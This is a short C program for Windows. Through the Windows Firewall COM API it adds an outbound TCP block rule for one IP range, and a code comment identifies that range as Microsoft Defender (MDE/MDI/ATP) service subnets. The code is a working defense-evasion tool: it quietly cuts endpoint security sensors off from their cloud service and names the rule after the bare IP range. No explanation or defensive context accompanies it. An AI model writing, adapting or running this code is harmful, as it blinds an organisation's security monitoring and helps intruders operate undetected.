// gcc firewall.c -o firewall.exe -lole32 -loleaut32 -luuid.
#include <windows.h>
#include <stdio.h>
#include <netfw.h>

int main() {
    HRESULT hr;
    GUID GUID_HNetCfg_FwPolicy2 = {0xe2b3c97f,0x6ae1,0x41ac,{0x81,0x7a,0xf6,0xf9,0x21,0x66,0xd7,0xdd}};
    IClassFactory *icf = NULL;
    IDispatch *id = NULL;
    INetFwPolicy2 *nfp2 = NULL;
    
    hr = CoInitialize(NULL);
    hr = CoGetClassObject(&GUID_HNetCfg_FwPolicy2, CLSCTX_LOCAL_SERVER | CLSCTX_INPROC_SERVER, NULL,  &IID_IClassFactory, (VOID **)&icf);

    if(hr != S_OK) {
        printf("CoGetClassObject failed: HRESULT 0x%08x\n", hr);
        CoUninitialize();
        ExitProcess(0);
    }

    hr = icf->lpVtbl->CreateInstance(icf, NULL, &IID_IDispatch, (VOID**)&id);
    if(hr != S_OK) {
        printf("CreateInstance failed: HRESULT 0x%08x\n", hr);
        CoUninitialize();
        ExitProcess(0);
    }

    INetFwRules *nfr = NULL;
    long profile = 0;
    nfp2 = (INetFwPolicy2*)id;
    nfp2->lpVtbl->get_CurrentProfileTypes(nfp2, &profile);

    printf("Profile ID is %d\n", profile);

    hr = nfp2->lpVtbl->get_Rules(nfp2, &nfr);
    if(hr != S_OK) {
        printf("get_Rules failed: HRESULT 0x%08x\n", hr);
        CoUninitialize();
        ExitProcess(0);
    }

    INetFwRule *nfrRule = NULL;
    icf = NULL;
    id = NULL;
    GUID GUID_HNet_FwRule = {0x2c5bc43e,0x3369,0x4c33,{0xab,0x0c,0xbe,0x94,0x69,0x67,0x7a,0xf4}};

    hr = CoGetClassObject(&GUID_HNet_FwRule, CLSCTX_LOCAL_SERVER | CLSCTX_INPROC_SERVER, NULL,  &IID_IClassFactory, (VOID **)&icf);

    if(hr != S_OK) {
        printf("CoGetClassObject failed: HRESULT 0x%08x\n", hr);
        CoUninitialize();
        ExitProcess(0);
    }

    hr = icf->lpVtbl->CreateInstance(icf, NULL, &IID_IDispatch, (VOID**)&id);
    if(hr != S_OK) {
        printf("CreateInstance failed: HRESULT 0x%08x\n", hr);
        CoUninitialize();
        ExitProcess(0);
    }

    // for loop through all the MDE/MDI/ATP/MICROSOFT RELATED SUBNETS
    WCHAR iprange[] = L"13.66.145.192/27";
    nfrRule = (INetFwRule*)id;
    // VARIANT_BOOL TRUE == -1
    nfrRule->lpVtbl->put_Enabled(nfrRule, -1);
    nfrRule->lpVtbl->put_Protocol(nfrRule, NET_FW_IP_PROTOCOL_TCP);
    nfrRule->lpVtbl->put_Action(nfrRule, NET_FW_ACTION_BLOCK);
    nfrRule->lpVtbl->put_Direction(nfrRule, NET_FW_RULE_DIR_OUT);
    nfrRule->lpVtbl->put_RemoteAddresses(nfrRule, iprange);
    nfrRule->lpVtbl->put_Name(nfrRule, iprange);

    hr = nfr->lpVtbl->Add(nfr, nfrRule);

    if(hr != S_OK) {
        printf("Add failed: HRESULT 0x%08x\n", hr);
        CoUninitialize();
        ExitProcess(0);
    }  

    nfp2->lpVtbl->Release(nfp2);
    nfrRule->lpVtbl->Release(nfrRule);
    nfr->lpVtbl->Release(nfr);
    CoUninitialize();

    return 0;
}
